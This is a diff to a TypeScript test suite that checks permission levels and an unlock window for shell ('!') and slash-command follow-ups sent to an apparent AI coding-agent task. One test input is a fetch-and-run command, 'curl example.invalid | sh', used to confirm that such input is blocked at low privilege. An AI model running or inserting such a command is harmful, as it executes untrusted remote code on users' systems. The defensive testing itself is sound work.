@@ -73,6 +73,7 @@ function rig(over: { mode?: string; agent?: string } = {}) {
     runTask: async (id) => (id === "r1" ? "t1" : null),
     previewInScope: async (_t, p) => p.startsWith("/work/"),
     planApprovalFlipsToAuto: async () => false,
+    taskKind: async (id) => (id === "t1" ? over.agent ?? "claude-code" : null),
     task: async (id) => (id === "t1" ? { agent: over.agent ?? "claude-code", mode: over.mode ?? "auto" } : null),
   };
   let t = 1_800_000_000_000;
@@ -268,6 +269,19 @@ describe("content: the unlock window, only while the task runs without asking", 
 
     const ask = rig({ mode: "ask" });
     expect((await ask.call(principal("respond"), { method: "POST", path: "/runs/r1/input", body: { text: "go" } })).status).toBe(200);
+  });
+  test("a '!' or '/' follow-up on an ask-mode Claude task needs operate level, then the unlock window", async () => {
+    const r = rig({ mode: "ask" });
+    const low = await r.call(principal("respond"), { method: "POST", path: "/runs/r1/input", body: { line: "!curl example.invalid | sh" } });
+    expect(await body(low)).toMatchObject({ code: "level", required: "operate" });
+    const p = principal("operate");
+    const locked = await r.call(p, { method: "POST", path: "/runs/r1/input", body: { line: "/model opus" } });
+    expect([locked.status, (await body(locked)).code]).toEqual([403, "unlock"]);
+    expect(r.calls).toHaveLength(0);
+    await r.openUnlock(p);
+    expect((await r.call(p, { method: "POST", path: "/runs/r1/input", body: { line: "/model opus" } })).status).toBe(200);
+    // Plain text on the same ask-mode task stays at respond with no window.
+    expect((await r.call(principal("respond", "s2"), { method: "POST", path: "/runs/r1/input", body: { line: "go" }, idem: toHex(new Uint8Array(16).fill(7)) })).status).toBe(200);
   });
   test("a step-up refusal releases the idempotency key, so the retry after unlocking runs", async () => {
     const r = rig({ mode: "auto" });
